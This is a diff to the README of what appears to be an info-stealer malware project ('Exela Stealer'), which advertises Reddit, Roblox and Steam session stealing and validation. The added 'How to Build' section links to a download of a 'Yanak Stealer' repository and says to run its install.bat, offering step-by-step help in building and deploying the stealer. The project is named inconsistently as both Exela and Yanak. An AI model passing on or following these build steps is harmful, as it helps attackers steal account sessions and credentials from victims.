@@ -7,6 +7,7 @@
 <h2>Table of Contents</h2>
 <ul>
   <li><a href="#features">Features</a></li>
+  <li><a href="#how-to-build">How to Build</a></li>
   <li><a href="#builder-settings">Builder Settings</a></li>
   <li><a href="#screenshots">Screenshots</a></li>
 </ul>
@@ -39,6 +40,18 @@
   <li>:speech_balloon: <strong>Reddit Session Stealer & Validator</strong> - Steals and validate Reddit sessions.</li>
   <li>:video_game: <strong>Roblox Session Stealer & Validator</strong> - Steals and validate Roblox sessions.</li>
   <li>:video_game: <strong>Steam Session Stealer & Validator</strong> - Steals and validate Steam sessions.</li>
+
+  <!-- How to Build Section -->
+<h2 id="how-to-build">How to Build 🛠️</h2>
+<p>To set up Exela Stealer, follow these steps:</p>
+<ol>
+  <li>:arrow_down: Download and Install <a href="https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe">python 3.11.0</a></li>
+  <li>:arrow_down: <a href="https://github.com/eyupware/YanakStealer">Download Yanak Stealer</a></li>
+  <li>:arrow_down: <a href="https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file">Extract</a> the zip file.</li>
+  <li>:point_right: Navigate to the Exela Stealer folder and double click <code>install.bat</code>.</li>
+  <li>:rocket: Follow the on-screen instructions to complete the setup.</li>
+  <li>:arrow_down: <a href="https://youtu.be/WNzhiaGLXBs">Tutorial Video</a></li>
+</ol>
 
 <!-- Builder Settings Section -->
 <h2 id="builder-settings">Builder Settings :wrench:</h2>
